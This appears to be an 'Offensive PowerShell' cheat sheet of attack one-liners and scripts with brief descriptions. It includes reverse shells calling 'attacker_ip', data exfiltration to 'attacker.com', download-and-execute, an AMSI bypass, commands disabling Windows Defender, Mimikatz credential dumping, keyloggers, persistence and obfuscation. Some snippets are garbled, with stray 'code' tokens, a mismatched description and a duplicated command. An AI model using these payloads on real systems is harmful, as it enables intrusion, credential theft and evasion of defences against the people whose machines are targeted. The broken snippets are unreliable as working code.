---
layout: attack
title: Offensive PowerShell
---

<img height="150" align="left" src="/images/offensive_powershell_logo.png" > Tiny collection of the offensive Side of PowerShell. Some parts of this collection can also be used for Blue Team duties.


- [Policy Bypass](#policy-bypass)
- [Enumerating System Information](#enumerating-system-information)
- [Extracting Network Configuration](#extracting-network-configuration)
- [Listing Running Processes with Details](#listing-running-processes-with-details)
- [Accessing Event Logs for Anomalies](#accessing-event-logs-for-anomalies)
- [Scanning for Open Ports](#scanning-for-open-ports)
- [Retrieving Stored Credentials](#retrieving-stored-credentials)
- [Executing Remote Commands](#executing-remote-commands)
- [Downloading and Executing Scripts from URL](#downloading-and-executing-scripts-from-url)
- [Bypassing Execution Policy for Script Execution](#bypassing-execution-policy-for-script-execution)
- [Enumerating Domain Users](#enumerating-domain-users)
- [Capturing Keystrokes](#capturing-keystrokes)
- [Extracting Wi-Fi Profiles and Passwords](#extracting-wi-fi-profiles-and-passwords)
- [Monitoring File System Changes](#monitoring-file-system-changes)
- [Creating Reverse Shell](#creating-reverse-shell)
- [Disabling Windows Defender](#disabling-windows-defender)
- [Conducting Network Sniffing](#conducting-network-sniffing)
- [Bypassing AMSI (Anti-Malware Scan Interface)](#bypassing-amsi-anti-malware-scan-interface)
- [Extracting System Secrets with Mimikatz](#extracting-system-secrets-with-mimikatz)
- [String Obfuscation](#string-obfuscation)
- [Command Aliasing](#command-aliasing)
- [Variable Name Obfuscation](#variable-name-obfuscation)
- [File Path Obfuscation](#file-path-obfuscation)
- [Using Alternate Data Streams for Evasion](#using-alternate-data-streams-for-evasion)
- [Bypassing Script Execution Policy](#bypassing-script-execution-policy)
- [In-Memory Script Execution](#in-memory-script-execution)
- [Dynamic Invocation with Reflection](#dynamic-invocation-with-reflection)
- [Encoded Command Execution](#encoded-command-execution)
- [Utilizing PowerShell Runspaces for Evasion](#utilizing-powershell-runspaces-for-evasion)
- [Environment Variable Obfuscation](#environment-variable-obfuscation)
- [Function Renaming for Evasion](#function-renaming-for-evasion)
- [Using PowerShell Classes for Code Hiding](#using-powershell-classes-for-code-hiding)
- [Registry Key Usage for Persistence](#registry-key-usage-for-persistence)
- [Out-Of-Band Data Exfiltration](#out-of-band-data-exfiltration)
- [Using PowerShell to Access WMI for Stealth](#using-powershell-to-access-wmi-for-stealth)
- [Scheduled Task for Persistence](#scheduled-task-for-persistence)
- [Using PowerShell to Interact with the Network Quietly](#using-powershell-to-interact-with-the-network-quietly)
- [Base 64 Encoding for Command Obfuscation](#base-64-encoding-for-command-obfuscation)
- [Utilizing PowerShell Add-Type for Code Execution](#utilizing-powershell-add-type-for-code-execution)
- [Extracting Credentials from Windows Credential Manager](#extracting-credentials-from-windows-credential-manager)
- [Retrieving Passwords from Unsecured Files](#retrieving-passwords-from-unsecured-files)
- [Dumping Credentials from Windows Services](#dumping-credentials-from-windows-services)
- [Extracting Saved RDP Credentials](#extracting-saved-rdp-credentials)
- [Retrieving Browser Cookies for Credential Theft](#retrieving-browser-cookies-for-credential-theft)
- [Extracting Credentials from IIS Application Pools](#extracting-credentials-from-iis-application-pools)
- [Reading Credentials from Configuration Files](#reading-credentials-from-configuration-files)
- [Dumping Credentials from Scheduled Tasks](#dumping-credentials-from-scheduled-tasks)
- [Extracting SSH Keys from User Directories](#extracting-ssh-keys-from-user-directories)
- [Retrieving Credentials from Database Connection Strings](#retrieving-credentials-from-database-connection-strings)
- [Simple PowerShell Reverse Shell](#simple-powershell-reverse-shell)
- [HTTP-Based PowerShell Reverse Shell](#http-based-powershell-reverse-shell)
- [WebSocket-Based PowerShell Reverse Shell](#websocket-based-powershell-reverse-shell)
- [DNS-Based PowerShell Reverse Shell](#dns-based-powershell-reverse-shell)
- [Encrypted PowerShell Reverse Shell](#encrypted-powershell-reverse-shell)
- [Invoke Windows API for Keylogging](#invoke-windows-api-for-keylogging)
- [Accessing Physical Memory with Windows API](#accessing-physical-memory-with-windows-api)
- [Using Windows API for Screen Capturing](#using-windows-api-for-screen-capturing)
- [Manipulating Windows Services via API](#manipulating-windows-services-via-api)
- [Windows API for Clipboard Access](#windows-api-for-clipboard-access)
- [Finding Writable and Executable Memory](#finding-writable-and-executable-memory)
- [Finding Shared Section Handles](#finding-shared-section-handles)
- [Modifying a Mapped Section](#modifying-a-mapped-section)
- [Process Creation and Command Line Parsing](#process-creation-and-command-line-parsing)
- [Security Implications of Command Line Parsing](#security-implications-of-command-line-parsing)
- [Using Shell APIs for Non-Executable Files](#using-shell-apis-for-non-executable-files)
- [Querying Service Status with PowerShell](#querying-service-status-with-powershell)
- [Finding Executables That Import Specific APIs](#finding-executables-that-import-specific-apis)
- [Finding Hidden Registry Keys or Values](#finding-hidden-registry-keys-or-values)
- [Modifying Token Privileges](#modifying-token-privileges)
- [Inspecting Executable Manifests](#inspecting-executable-manifests)
- [Manual Elevation of Process](#manual-elevation-of-process)
- [Accessing and Displaying Linked Tokens](#accessing-and-displaying-linked-tokens)
  - [For Full Token](#for-full-token)
  - [For Limited Token](#for-limited-token)

<!-- cSpell:disable -->
### Policy Bypass
```powershell
 powershell -ep bypass
```

### Enumerating System Information
This command retrieves detailed information about the operating system, including version, build, and system
architecture.

```powershell
Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
```

### Extracting Network Configuration
This command gathers network configuration details such as interface aliases, IPv4 and IPv6 
addresses, and DNS server information.

```powershell
Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property *
```

### Listing Running Processes with Details
Lists all currently running processes on the system, sorted by CPU usage, and includes process names, IDs, and
CPU time.

```powershell
Get-Process | Select-Object -Property ProcessName, Id, CPU | Sort-Object -Property CPU -Descending
```

### Accessing Event Logs for Anomalies
Searches the Security event log for entries where the entry type is ‘FailureAudit’, which can indicate security-related anomalies.

```powershell
Get-EventLog -LogName Security | Where-Object {$_.EntryType -eq 'FailureAudit'}
````

### Scanning for Open Ports
Scans the rst 1024 ports on the local machine to check for open ports, which can be used to identify potential
vulnerabilities.

```powershell
1..1024 | ForEach-Object { $sock = New-Object System.Net.Sockets.TcpClient; $async =
$sock.BeginConnect('localhost', $_, $null, $null); $wait = $async.AsyncWaitHandle.WaitOne(100, $false);
if($sock.Connected) { $_ } ; $sock.Close() }
```

### Retrieving Stored Credentials
Prompts for user credentials and then displays the username and password, useful for credential harvesting.

```powershell
$cred = Get-Credential; $cred.GetNetworkCredential() | Select-Object -Property UserName, Password
```

### Executing Remote Commands
Executes a command remotely on a target PC, in this case, listing processes. Requires credentials for the target
system.

```powershell
Invoke-Command -ComputerName TargetPC -ScriptBlock { Get-Process } -Credential (Get-Credential)
```

### Downloading and Executing Scripts from URL
Downloads and executes a PowerShell script from a specific URL. Useful for executing remote payloads.

```powershell
$url = 'http://example.com/script.ps1'; Invoke-Expression (New-Object
Net.WebClient).DownloadString($url)
```

### Bypassing Execution Policy for Script Execution
Temporarily bypasses the script execution policy to run a PowerShell script, allowing execution of unsigned scripts.

```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; .\script.ps
```

### Enumerating Domain Users
Retrieves a list of all domain users, including their names, account status, and last logon dates.

```powershell
Get-ADUser -Filter * -Properties * | Select-Object -Property Name, Enabled, LastLogonDate
```

### Capturing Keystrokes

Captures and logs keystrokes to a le, which can be used for gathering sensitive information like passwords.

```powershell
$path = 'C:\temp\keystrokes.txt'; Add-Type -AssemblyName System.Windows.Forms; $listener = New-Object System.Windows.Forms.Keylogger; [System.Windows.Forms.Application]::Run($listener); $listener.Keys | Out-File -FilePath $path
```

### Extracting Wi-Fi Profiles and Passwords
Extracts Wi-Fi network proles and their associated passwords stored on the system.

```powershell
netsh wlan show profiles | Select-String -Pattern 'All User Profile' -AllMatches | ForEach-Object { $_
-replace 'All User Profile *: ', '' } | ForEach-Object { netsh wlan show profile name="$_" key=clear }
```

### Monitoring File System Changes
Sets up a monitor on the le system to track and log any changes, such as le creation, which can be useful for detecting suspicious activity.

```powershell
$watcher = New-Object System.IO.FileSystemWatcher; $watcher.Path = 'C:\';
$watcher.IncludeSubdirectories = $true; $watcher.EnableRaisingEvents = $true; Register-ObjectEvent
$watcher 'Created' -Action { Write-Host 'File Created: ' $Event.SourceEventArgs.FullPath }
```

### Creating Reverse Shell

Establishes a reverse shell connection to a specified attacker-controlled machine, allowing remote command
execution.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream =
$client.GetStream(); [byte[]]$bytes = 0..65535...
```

### Disabling Windows Defender

Extracts passwords saved in web browsers and saves them to a le, useful for credential harvesting.

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Disables Windows Defender’s real-time monitoring feature, which can help in evading detection.
Extracting Browser Saved Passwords
Invoke-WebBrowserPasswordDump | Out-File -FilePath C:\temp\browser_passwords.txt
```

### Conducting Network Sniffing

Sets up a network capture session to sni packets, which can be analyzed for sensitive data or network
troubleshooting.

```powershell
$adapter = Get-NetAdapter | Select-Object -First 1; New-NetEventSession -Name 'Session1' -CaptureMode
SaveToFile -LocalFilePath 'C:\temp\network_capture.etl'; Add-NetEventPacketCaptureProvider -SessionName
'Session1' -Level 4 -CaptureType Both -Enable; Start-NetEventSession -Name 'Session1'; Stop-
NetEventSession -Name 'Session1' after 60
```

### Bypassing AMSI (Anti-Malware Scan Interface)

Bypasses the Anti-Malware Scan Interface (AMSI) in PowerShell, allowing the execution of potentially malicious scripts without detection.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Extracting System Secrets with Mimikatz
Uses Mimikatz to extract logon passwords and other sensitive data from system memory.

```powershell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"' | Out-File -FilePath C:\temp\logonpasswords.txt
```

### String Obfuscation

Obfuscates a string (e.g., a command) using Base64 encoding to evade detection by security tools.

```powershell
$originalString = 'SensitiveCommand'; $obfuscatedString =
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($originalString)); $decodedString =code code
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($obfuscatedString)); Invoke-code
Expression $decodedStringcode
```

### Command Aliasing

Creates an alias for a PowerShell command to disguise its true purpose, which can be useful in evading script analysis.

```powershell
$alias = 'Get-Dir'; Set-Alias -Name $alias -Value Get-ChildItem; Invoke-Expression $alias
```

### Variable Name Obfuscation

Obfuscates a command by splitting it into parts and reassembling it, making the command less recognizable to security tools.

```powershell
$o = 'Get'; $b = 'Process'; $cmd = $o + '-' + $b; Invoke-Expression $cmd
```

### File Path Obfuscation

Obfuscates a le path using Base64 encoding, making it harder to detect malicious le paths or commands.

```powershell
$path =
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QzpcVGVtcFxBZG1pblRvb2xz'));
Invoke-Item $path
```


### Using Alternate Data Streams for Evasion

Hides malicious commands or data in alternate data streams of les, which is a method often used to evade detection.

```powershell
$content = 'Invoke-Mimikatz'; $file = 'C:\temp\normal.txt'; $stream = 'C:\temp\normal.txt:hidden'; Set-
Content -Path $file -Value 'This is a normal file'; Add-Content -Path $stream -Value $content; Get-
Content -Path $stream
```

### Bypassing Script Execution Policy

Temporarily changes the script execution policy to allow the running of unauthorized scripts, then reverts it back to its original setting.

```powershell
$policy = Get-ExecutionPolicy; Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process; # Run your
script here; Set-ExecutionPolicy -ExecutionPolicy $policy -Scope Process
```

### In-Memory Script Execution

Executes a PowerShell script entirely in memory without writing to disk, helping to evade le-based detection mechanisms.

```powershell
$code = [System.IO.File]::ReadAllText('C:\temp\script.ps1'); Invoke-Expression $code code
```

### Dynamic Invocation with Reflection

Uses reaction to dynamically invoke system management functions, allowing for more stealthy execution of commands.

```powershell
$assembly = [Reflection.Assembly]::LoadWithPartialName('System.Management'); $type =
$assembly.GetType('System.Management.ManagementObjectSearcher'); $constructor =
$type.GetConstructor(@([string])); $instance = $constructor.Invoke(@('SELECT * FROM Win32_Process'));
$method = $type.GetMethod('Get'); $result = $method.Invoke($instance, @())
```

### Encoded Command Execution

Executes a Base64-encoded PowerShell command, which can help bypass simple command-line logging and code analysis tools.

```powershell
$encodedCmd = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Get-Process'));code code
powershell.exe -EncodedCommand $encodedCmdcode code
```

### Utilizing PowerShell Runspaces for Evasion

Executes PowerShell commands within a separate runspace, isolating them from the main PowerShell
environment and evading some forms of detection.

```powershell
$runspace = [runspacefactory]::CreateRunspace(); $runspace.Open(); $pipeline =
$runspace.CreatePipeline(); $pipeline.Commands.AddScript('Get-Process'); $results = $pipeline.Invoke();
$runspace.Close(); $results
```

### Environment Variable Obfuscation

Stores a command in an environment variable and then executes it, which can help hide the command from casual observation and some security tools.

```powershell
$env:PSVariable = 'Get-Process'; Invoke-Expression $env:PSVariable
```

### Function Renaming for Evasion

Renames a PowerShell function to something less conspicuous, which can help in evading script analysis and monitoring tools.

```powershell
Function MyGetProc { Get-Process }; MyGetProc
```

### Using PowerShell Classes for Code Hiding

Defines a custom PowerShell class to encapsulate and hide malicious code, making it harder for security tools to detect.

```powershell
class HiddenCode { [string] Run() { return 'Hidden command executed' } }; $instance =Code
[HiddenCode]::new(); $instance.Run()
```

### Registry Key Usage for Persistence

Uses the Windows Registry to store and later execute encoded payloads, aiding in persistence and evasion.

```powershell
$path = 'HKCU:\Software\MyApp'; New-Item -Path $path -Force; New-ItemProperty -Path $path -Name
'Config' -Value 'EncodedPayload' -PropertyType String -Force; $regValue = Get-ItemProperty -Path $path
-Name 'Config'; Invoke-Expression $regValue.Config
```

### Out-Of-Band Data Exfiltration

Exfiltrate data out of the target network using web requests, which can bypass traditional data loss prevention mechanisms.

```powershell
$data = Get-Process | ConvertTo-Json; Invoke-RestMethod -Uri 'http://attacker.com/data' -Method Post - Body $data
```

### Using PowerShell to Access WMI for Stealth

Leverages WMI (Windows Management Instrumentation) to execute system queries, which can be less
conspicuous than direct PowerShell commands.

```powershell
$query = 'SELECT * FROM Win32_Process'; Get-WmiObject -Query $query
```

### Scheduled Task for Persistence

Creates a scheduled task to execute PowerShell commands, ensuring persistence and execution even after system reboots.

```powershell
$action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -
Command "YourCommand"'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -Action
$action -Trigger $trigger -TaskName 'MyTask' -Description 'MyDescription'
```

### Using PowerShell to Interact with the Network Quietly

Establishes a network connection for quiet data transmission, useful for maintaining stealth during data exfiltration or command and control operations.

```powershell
$client = New-Object Net.Sockets.TcpClient('attacker_ip', 443); $stream = $client.GetStream(); # Send and receive data
```

### Base 64 Encoding for Command Obfuscation

Encodes a PowerShell command in Base64 to obfuscate it, making it less detectable by security tools.

```powershell
$command = 'Get-Process'; $encodedCommand =code
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command)); powershell.exe -code
EncodedCommand $encodedCommand
```

### Utilizing PowerShell Add-Type for Code Execution

Defines and executes code within a custom .NET class using PowerShell, which can be used to hide malicious activities within seemingly benign code

```powershell
Add-Type -TypeDefinition 'using System; public class MyClass { public static void Run() {
Console.WriteLine("Executed"); } }'; [MyClass]::Run()
```

### Extracting Credentials from Windows Credential Manager

This command utilizes the PSCredentialManager module to extract stored credentials from the Windows Credential Manager, focusing on generic 
credentials.

```powershell
$credman = New-Object -TypeName PSCredentialManager.Credential; $credman | Where-Object { $_.Type -eq
'Generic' } | Select-Object -Property UserName, Password
```

### Retrieving Passwords from Unsecured Files

Searches for the term ‘password’ in all text les within the Documents folders of all users, which can reveal passwords stored insecurely.

```powershell
Select-String -Path C:\Users\*\Documents\*.txt -Pattern 'password' -CaseSensitive
```

### Dumping Credentials from Windows Services

Lists Windows services that are running under a specifc user account, which can sometimes include
credentials in the service configuration.

```powershell
Get-WmiObject win32_service | Where-Object {$_.StartName -like '*@*'} | Select-Object Name, StartName,DisplayName
```

### Extracting Saved RDP Credentials

Lists and deletes saved Remote Desktop Protocol (RDP) credentials, which can be used to access remote systems.

```powershell
cmdkey /list | Select-String 'Target: TERMSRV' | ForEach-Object { cmdkey /delete:($_ -split ' ')[-1] }
```

### Retrieving Browser Cookies for Credential Theft

Accesses the Chrome browser’s Cookies le, which can contain session cookies that might be exploited for session hijacking.

```powershell
$env:USERPROFILE + '\AppData\Local\Google\Chrome\User Data\Default\Cookies' | Get-Item
```

### Extracting Credentials from IIS Application Pools

Retrieves configuration details of IIS Application Pools, including service accounts, which might contain credentials.

```powershell
Import-Module WebAdministration; Get-IISAppPool | Select-Object Name, ProcessModel
````

### Reading Credentials from Configuration Files

Searches for strings containing ‘password=’ in all .cong les on the C: drive, which can reveal hardcoded credentials.

```powershell
Get-ChildItem -Path C:\ -Include *.config -Recurse | Select-String -Pattern 'password='
```

### Dumping Credentials from Scheduled Tasks

Lists scheduled tasks that are configured to run under specifc user accounts, potentially revealing credentials used for task execution.

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -notlike 'S-1-5-18'} | Select-Object TaskName, TaskPath, Principal
```

### Extracting SSH Keys from User Directories

Searches for RSA private keys in the .ssh directories of all users, which can be used for unauthorized access to SSH servers.

```powershell
Get-ChildItem -Path C:\Users\*\.ssh\id_rsa -Recurse
```

### Retrieving Credentials from Database Connection Strings

Scans for database connection strings in web application configuration les, which often contain credentials for database access.

```powershell
Select-String -Path C:\inetpub\wwwroot\*.config -Pattern 'connectionString' -CaseSensitive
```

### Simple PowerShell Reverse Shell

Establishes a basic reverse shell connection to a specified attacker-controlled machine. This allows the attacker to execute commands remotely.

```powershell
$client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream =
$client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0,
$bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,
$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()}; $client.Close()
```

### HTTP-Based PowerShell Reverse Shell

This script creates a more resilient reverse shell that attempts to reconnect every 10 seconds if the connection is lost. It uses HTTP for communication.

```powershell
while($true) { try { $client = New-Object System.Net.Sockets.TCPClient('attacker_ip', attacker_port);
$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0,
$bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,
$i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()}; $client.Close() } catch { Start-Sleep -Seconds 10 } }
```

### WebSocket-Based PowerShell Reverse Shell

Establishes a reverse shell using WebSockets, which can be more stealthy and bypass some network monitoring tools.

```powershell
$ClientWebSocket = New-Object System.Net.WebSockets.ClientWebSocket; $uri = New-Object
System.Uri("ws://attacker_ip:attacker_port"); $ClientWebSocket.ConnectAsync($uri, $null).Result;
$buffer = New-Object Byte[] 1024; while ($ClientWebSocket.State -eq 'Open') { $received =
$ClientWebSocket.ReceiveAsync($buffer, $null).Result; $command =
[System.Text.Encoding]::ASCII.GetString($buffer, 0, $received.Count); $output = iex $command 2>&1 |
Out-String; $bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($output);
$ClientWebSocket.SendAsync($bytesToSend, 'Binary', $true, $null).Wait() }
```

### DNS-Based PowerShell Reverse Shell

This script uses DNS requests to exfiltrate data, making the reverse shell track appear as DNS queries, which can be less suspicious and harder to detect.

```powershell
function Invoke-DNSReverseShell { param([string]$attacker_ip, [int]$attacker_port) $client = New-Object
System.Net.Sockets.TCPClient($attacker_ip, $attacker_port); $stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data =
(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 |
Out-String ); $encodedSendback =
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($sendback)); nslookupcode
$encodedSendback $attacker_ip; $stream.Flush()}; $client.Close() }
```

### Encrypted PowerShell Reverse Shell

Creates an encrypted reverse shell using SSL to secure the communication channel, making it more difficult for network security measures to inspect the traffic.

```powershell
$ErrorActionPreference = 'SilentlyContinue'; $client = New-Object
System.Net.Sockets.TCPClient('attacker_ip', attacker_port); $stream = $client.GetStream(); $sslStream =
New-Object System.Net.Security.SslStream($stream, $false, {$true} );
$sslStream.AuthenticateAsClient('attacker_ip'); $writer = New-Object
System.IO.StreamWriter($sslStream); $reader = New-Object System.IO.StreamReader($sslStream);
while($true) { $writer.WriteLine('PS ' + (pwd).Path + '> '); $writer.Flush(); $command =
$reader.ReadLine(); if($command -eq 'exit') { break; }; $output = iex $command 2>&1 | Out-String;
$writer.WriteLine($output); $writer.Flush() }; $client.Close()
```

### Invoke Windows API for Keylogging

This script uses a Windows API call to check the state of each key on the keyboard, eectively logging
keystrokes. It can be used to capture user input.

```powershell
Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class KeyLogger
{ [DllImport("user32.dll")] public static extern int GetAsyncKeyState(Int32 i); } "@ while ($true) {
Start-Sleep -Milliseconds 100 for ($i = 8; $i -le 190; $i++) { if ([KeyLogger]::GetAsyncKeyState($i) -
eq -32767) { $Key = [System.Enum]::GetName([System.Windows.Forms.Keys], $i) Write-Host $Key } } }
```

### Accessing Physical Memory with Windows API

This PowerShell script uses the ReadProcessMemory function from the Windows API to read a specified amount of memory from a process. It’s useful for extracting information from running processes.

```powershell
Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class
MemoryReader { [DllImport("kernel32.dll")] public static extern bool ReadProcessMemory(IntPtr hProcess,
IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out int lpNumberOfBytesRead); } "@ $process = Get-Process -Name 'process_name' $handle = $process.Handle $buffer = New-Object byte[] 1024 $bytesRead
= 0 [MemoryReader]::ReadProcessMemory($handle, [IntPtr]0x00000000, $buffer, $buffer.Length,
[ref]$bytesRead)
```

### Using Windows API for Screen Capturing

This script demonstrates how to use Windows API calls to capture the screen. It can be used for surveillance or information gathering.

```powershell
Add-Type -TypeDefinition @" using System; using System.Drawing; using System.Runtime.InteropServices;
public class ScreenCapture { [DllImport("user32.dll")] public static extern IntPtr GetDesktopWindow();
[DllImport("user32.dll")] public static extern IntPtr GetWindowDC(IntPtr hWnd);
[DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hObject, int nXDest, int nYDest, int
nWidth, int nHeight, IntPtr hObjectSource, int nXSrc, int nYSrc, int dwRop); } "@ $desktop =
[ScreenCapture]::GetDesktopWindow() $dc = [ScreenCapture]::GetWindowDC($desktop) # Further code tocode
perform screen capture goes here
```

### Manipulating Windows Services via API

This script uses Windows API calls to interact with Windows services, such as creating, starting, or modifying them. This can be used for persistence or privilege escalation.

```powershell
Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; public class
ServiceManager { [DllImport("advapi32.dll", SetLastError = true)] public static extern IntPtr
OpenSCManager(string lpMachineName, string lpSCDB, int scParameter); [DllImport("advapi32.dll",
SetLastError = true)] public static extern IntPtr CreateService(IntPtr SC_HANDLE, string lpSvcName,
string lpDisplayName, int dwDesiredAccess, int dwServiceType, int dwStartType, int dwErrorControl,
string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lp,
string lpPassword); [DllImport("advapi32.dll", SetLastError = true)] public static extern bool
StartService(IntPtr SVHANDLE, int dwNumServiceArgs, string lpServiceArgVectors); } "@ $scManagerHandle
= [ServiceManager]::OpenSCManager(null, null, 0xF003F) # Further code to create, modify, or start
services goes here
```

### Windows API for Clipboard Access

This script demonstrates how to access and manipulate the Windows clipboard using API calls. It can be used to read or modify clipboard contents for information gathering or data manipulation.

```powershell
Add-Type -TypeDefinition @" using System; using System.Runtime.InteropServices; using System.Text;
public class ClipboardAPI { [DllImport("user32.dll")] public static extern bool OpenClipboard(IntPtr
hWndNewOwner); [DllImport("user32.dll")] public static extern bool CloseClipboard();
[DllImport("user32.dll")] public static extern IntPtr GetClipboardData(uint uFormat);
[DllImport("kernel32.dll")] public static extern IntPtr GlobalLock(IntPtr hMem);
[DllImport("kernel32.dll")] public static extern bool GlobalUnlock(IntPtr hMem);
[DllImport("kernel32.dll")] public static extern int GlobalSize(IntPtr hMem); } "@
[ClipboardAPI]::OpenClipboard([IntPtr]::Zero) $clipboardData = [ClipboardAPI]::GetClipboardData(13) #


CF_TEXT format $gLock = [ClipboardAPI]::GlobalLock($clipboardData) $size =
[ClipboardAPI]::GlobalSize($clipboardData) $buffer = New-Object byte[] $size
[System.Runtime.InteropServices.Marshal]::Copy($gLock, $buffer, 0, $size)
[ClipboardAPI]::GlobalUnlock($gLock) [ClipboardAPI]::CloseClipboard()
[System.Text.Encoding]::Default.GetString($buffer)
```

### Finding Writable and Executable Memory

This script is used to identify memory regions within a process that are both writable and executable. Such memory regions can be indicative of malicious activity, such as the injection of shellcode. The script starts by
opening a process with limited query access and then enumerates the virtual memory regions, iterating for those with ExecuteReadWrite protection.

**Description** : This technique is useful for identifying potential malicious memory usage within processes, which can be a sign of code injection or other forms of runtime manipulation.

```powershell
$proc = Get-NtProcess -ProcessId $pid -Access QueryLimitedInformation Get-NtVirtualMemory -Process
$proc | Where-Object { $_.Protect -band "ExecuteReadWrite" }
```

### Finding Shared Section Handles

This script identifies writable Section objects that are shared between two processes. It rst groups handles by their kernel object address and then lters for those shared between exactly two processes. It checks for MapWrite access and then determines if the Section is shared between a privileged and a low-privileged process.

**Description** : This technique is useful for identifying shared resources that might be exploited in privilege escalation attacks. Shared writable sections can be a vector for manipulating a higher-privileged process from
a lower-privileged one.

```powershell
$ss = Get-NtHandle -ObjectType Section -GroupByAddress | Where-Object ShareCount -eq 2 $mask = Get-
NtAccessMask -SectionAccess MapWrite $ss = $ss | Where-Object { Test-NtAccessMask $_.AccessIntersection
$mask } foreach($s in $ss) { $count = ($s.ProcessIds | Where-Object { Test-NtProcess -ProcessId $_ -
Access DupHandle }).Count if ($count -eq 1) { $s.Handles | Select ProcessId, ProcessName, Handle } }
```

### Modifying a Mapped Section

This script demonstrates how to modify a mapped section of memory. It duplicates a handle into the current
process, maps it as read-write, and then writes random data to the memory region.

**Description** : This technique can be used to test the stability and security of shared memory sections. By modifying the contents of a shared section, you can potentially inuence the behavior of another process that shares the same memory, which could lead to security vulnerabilities.

```powershell
$sect = $handle.GetObject() $map = Add-NtSection -Section $sect -Protection ReadWrite $random = Get-
RandomByte -Size $map.Length Write-NtVirtualMemory -Mapping $map -Data $random
```

### Process Creation and Command Line Parsing

This command creates a new process using the New-Win32Process command, which internally calls the Win CreateProcess API. The command line string species the executable to run and any arguments. The CreateProcess API parses this command line to nd the executable le, handling cases where the executable name does not include an extension like .exe.

**Description** : This technique is crucial for understanding how processes are created and how command line arguments are parsed in Windows. It’s particularly relevant for scenarios where a red teamer might need to execute a process with specific parameters or in a certain context.

```powershell
$proc = New-Win32Process -CommandLine "notepad test.txt"
```

### Security Implications of Command Line Parsing

By specifying the ApplicationName property, you can avoid security risks associated with the default command line parsing behavior of New-Win32Process. This method ensures that the executable path is passed verbatim to the new process, preventing potential hijacking scenarios where a less privileged user could inuence the process creation path.

**Description** : This command is a safer alternative for process creation, especially in scenarios where a process with higher privileges creates a new process. It mitigates the risk of path hijacking and unintended execution of malicious executables.

```powershell
$proc = New-Win32Process -CommandLine "notepad test.txt" -ApplicationName "c:\windows\notepad.exe"
```

### Using Shell APIs for Non-Executable Files

This command uses Start-Process with a specified verb to handle non-executable les, such as text
documents. Start-Process internally uses shell APIs like ShellExecuteEx, which can handle various le types by looking up the appropriate handler from the registry.

**Description** : This technique is useful when you need to interact with non-executable les in a way that mimics user actions, such as opening, editing, or printing a le. It leverages the shell’s ability to determine the correct application to use for a given le type.
**Service Control Manager (SCM) Overview** The SCM is a critical component in Windows, responsible for
managing system services. These services include:

1. **Remote Procedure Call Subsystem (RPCSS)** : Manages remote procedure call endpoints.
2. **DCOM Server Process Launcher** : Starts COM server processes.
3. **Task Scheduler** : Schedules actions at specific times.
4. **Windows Installer** : Manages program installations.
5. **Windows Update** : Automatically checks and installs updates.
6. **Application Information** : Facilitates User Account Control (UAC) for switching between administrator and
non-administrator users.

**Description** : Understanding SCM is vital for red teamers to manipulate or analyze services that run with higher
privileges, potentially exploiting them for gaining elevated access or persistence.


### Querying Service Status with PowerShell

This command uses Get-Win32Service, a more comprehensive alternative to the built-in Get-Service command in PowerShell. It provides detailed information about each service, including its status (Running or Stopped)
and Process ID.

**Description** : This command is useful for reconnaissance and monitoring of service states on a target system, allowing red teamers to identify potential targets or understand the system’s configuration.

```powershell
PS> Get-Win32Service
```

### Finding Executables That Import Specific APIs

This script identifies executables that import the CreateProcessW API, which can be crucial for finding potential targets for exploitation or understanding how certain applications interact with system processes.

**Description** : This technique is particularly useful for narrowing down a large set of executables to those that
are relevant for a specific vulnerability or behavior, such as process creation.

```powershell
PS> $imps = ls "$env:WinDir\*.exe" | ForEach-Object { Get-Win32ModuleImport -Path $_.FullName } PS>
$imps | Where-Object Names -Contains "CreateProcessW" | Select-Object ModulePath
````


### Finding Hidden Registry Keys or Values

This command is used to nd hidden registry keys, particularly those with NUL characters in their names,which are often used by malware to evade detection.

